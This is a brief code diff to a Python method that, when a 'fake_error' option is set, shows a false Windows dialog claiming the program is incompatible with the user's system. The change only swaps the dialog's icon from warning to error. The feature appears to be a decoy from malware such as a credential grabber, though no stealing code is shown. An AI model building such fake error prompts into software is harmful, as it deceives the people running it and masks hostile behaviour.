@@ -308,7 +308,7 @@ class initial_func(Functions):
     def error_remote(self: str) -> str:
         if self.fake_error == "yes":
             current_path = os.path.abspath(__file__)
-            icon_type = 0x30
+            icon_type = 0x10
             ctypes.windll.user32.MessageBoxW(
                 None,
                 '''The Version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-Bit) version of the program, and then contact the software publisher.''',
